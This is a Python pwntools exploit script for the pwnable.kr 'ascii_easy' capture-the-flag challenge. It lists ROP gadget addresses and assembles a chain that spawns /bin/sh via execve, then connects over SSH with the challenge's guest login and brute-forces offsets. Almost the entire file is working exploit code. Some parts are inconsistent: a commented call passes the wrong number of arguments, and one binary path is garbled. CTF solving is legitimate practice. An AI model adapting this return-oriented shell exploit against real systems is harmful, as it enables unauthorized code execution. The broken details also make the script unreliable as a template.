from pwn import *

"""
USEFUL Gadgets:
# until edx is pointer to /bin/sh (last part of payload)
0x55642d7a : inc edx ; xor eax, eax ; ret 

# move edx to ebx 
0x55606476 : mov ebx, edx ; cmp eax, 0xfffff001 ; jae 0xa8480 ; ret

# Use the inc edx again until reaching a 0 word value on the stack

# store 0 in ECX
0x555f616f : mov ecx, dword ptr [edx] ; test ecx, ecx ; jne 0x98168 ; pop esi ; pop edi ; pop ebp ; ret 

# Add 12 bytes of garbage to cancel the pops effect

# store 0 in edx
0x55617940 : mov edx, 0xffffffff ; cmovne eax, edx ; ret
0x55642d7a : inc edx ; xor eax, eax ; ret

# 11 times (for sys_execve)
0x556c6864 : inc eax ; ret 0

# call int 80h to execute sys 
0x55667176 : inc esi ; int 0x80

"""

INCREASE_EDX_GADGET = 0x55642d7a
INCREASE_EAX_GADGET = 0x556c6864
MOVE_EDX_TO_EBX_GADGET = 0x55606476
INT_80_GADGET = 0x55667176
STORE_MAX_INT_IN_EDX = 0x55617940
STORE_DEREFERNCED_EDX_IN_ECX = 0x555f616f

REMOTE_BINARY_PATH = '/home/ascii_easy/ascii_easy'


def build_payload(i: int, j: int) -> bytes:
    rop_builder = ROP(elfs=[ELF('ascii_easy')])

    increase_edx_until_bin_sh = [INCREASE_EDX_GADGET] * i
    increase_eax_to_sys_execve = [INCREASE_EAX_GADGET] * 11

    increase_edx_until_zero = [INCREASE_EDX_GADGET] * j

    store_zero_in_edx = [
        STORE_MAX_INT_IN_EDX,
        INCREASE_EDX_GADGET
    ]

    gadgets = [
        *increase_edx_until_bin_sh,
        MOVE_EDX_TO_EBX_GADGET,
        *increase_edx_until_zero,
        STORE_DEREFERNCED_EDX_IN_ECX,
        b'A' * 12,
        *store_zero_in_edx,
        *increase_eax_to_sys_execve,
        INT_80_GADGET
    ]

    for gadget in gadgets:
        rop_builder.call(gadget)

    return b'A' * 32 + bytes(rop_builder) + b'/bin/sh'


def main() -> None:
    connection = ssh('ascii_easy', host='pwnable.kr', port=2222, password='guest')

    # for i in range(4, 255):
    #     print(f'Checking {i} words...')
    #     p = connection.process([REMOTE_BINARY_PATH, build_payload(i)], REMOTE_BINARY_PATH)
    #     print(p.recvall(timeout=5))

    context.log_level = 'error'
    for i in range(4, 30):
        for j in range(10, 200):
            p = connection.process(
                ['/home/or/workspAAAAAAAAAAAAAAAAaaaace/CTFs/pwnable/ascii_easy/ascii_easy', build_payload(i, j)],
                executable='/home/or/workspace/CTFs/pwnable/ascii_easy/ascii_easy'
            )
            
            p.recvall(timeout=6)
            print(i, j)


if __name__ == '__main__':
    main()
